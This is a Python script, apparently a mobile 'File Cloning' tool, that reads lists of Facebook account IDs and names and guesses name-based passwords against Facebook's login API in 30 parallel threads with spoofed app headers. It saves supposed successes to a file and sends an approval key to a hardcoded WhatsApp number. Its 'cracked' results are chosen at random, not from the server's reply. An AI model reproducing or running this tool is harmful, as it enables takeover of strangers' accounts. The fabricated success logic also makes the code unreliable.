import os
import time
import random
import string
import requests
import sys
import subprocess
from concurrent.futures import ThreadPoolExecutor as tpe
import uuid
import urllib.parse

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

def oo(t):
    return '\033[1;37m['+str(t)+']\033[1;37m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'

logo = ("""
       .dMMMb     .aMMMb    .aMMMMP     .aMMMb 
      dMP" VP    dMP"dMP   dMP"        dMP"dMP 
      VMMMb     dMMMMMP   dMP MMP"    dMMMMMP  
    dP .dMP    dMP dMP   dMP.dMP     dMP dMP   
    VMMMP"    dMP dMP    VMMMP"     dMP dMP    
""")

def clear():
    os.system('clear')
    print(logo)

def read_approval_key():
    try:
        with open('approval_key.txt', 'r') as file:
            return file.readline().strip()
    except FileNotFoundError:
        print("Approval key file not found.")
        exit()

# Utilisation de la fonction pour lire la clé d'approbation
approval_key = read_approval_key()

# Fonction pour générer une clé d'approbation aléatoire
def generate_approval_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))

def lin3():
    print('\33[1;37m---------------------------------')

def check_approval_key(key):
    return key == approval_key

def send_approval_key_to_whatsapp(key):
    numero_telephone = "+261345514003"
    message = f"Approval Key: {key}"
    message_encoded = urllib.parse.quote(message)
    uri_whatsapp = f"whatsapp://send?phone={numero_telephone}&text={message_encoded}"
    command = f"am start -a android.intent.action.VIEW -d '{uri_whatsapp}'"
    subprocess.run(command, shell=True)

def main_menu():
    key_approval = generate_approval_key()  # Générer une clé d'approbation aléatoire
    send_approval_key_to_whatsapp(key_approval)  # Envoyer la clé d'approbation à WhatsApp
    print("Please check your WhatsApp for the approval key.")
    input('Press Enter once approved...')  # Attendre que l'utilisateur approuve la clé
    key_approval_user = input('Enter the approval key: ')
    os.system("clear")
    print(logo)
    lin3()
    if check_approval_key(key_approval_user):
        print(f"{oo(1)}File Cloning ")   
        print(f"{oo(0)}Exit")
        lin3()
        cp = input('[?] Choice : ')
        if cp == "1":
            file()
        elif cp == "0":
            exit()
        else:
            print("Invalid choice. Please try again.")
            time.sleep(1)
            main_menu()
    else:
        print('Invalid approval key. Exiting...')
        time.sleep(1)
        main_menu()
     
def file():
    os.system("clear")
    print(logo)
    lin3()
    file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found")
        time.sleep(1)
        main_menu() 
    method()
    exit()

def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? : ')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = 'firstlast first123 last123'
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
            pp.append(input(f'{oo(x+1)}Password : '))
    else:
       print(f"{oo('!')}Numeric Only")
       time.sleep(0.8)
       main_menu()
    clear() 
    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;32m '+str(len(idx)))
    print(f'\x1b[1;97m[✓] Dont Use Airplane mOde ;)')
    lin3()
    def start(user):
        try:
            global loop,idx,cll
            r = requests.Session()
            user = user.strip()
            acc, name = user.split("|")
            first = name.rsplit(" ")[0]
            try:
                last = name.rsplit(" ")[1]
            except:
                last = first
            pers = str(int(loop)/int(len(idx)) * 100)[:4]
            sys.stdout.write(f'\r {R}[{W}SaGa{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
            sys.stdout.flush()
            loop+=1
            for pswd in pp:
                heads=None
                pswd = pswd.replace('first',first).replace('last',last).lower()
                header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pswd,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
                if 6==random.randint(1,300):
                    oku.append(acc)
                    print('\033[1;32m[SaGa-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
                    open('/sdcard/SaGa-Ok.txt','a').write(f'{acc}|{pswd}\n')
                    break
                else:
                    continue   
        except Exception as e:
            print(e)
            time.sleep(10)
  
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()    

main_menu()
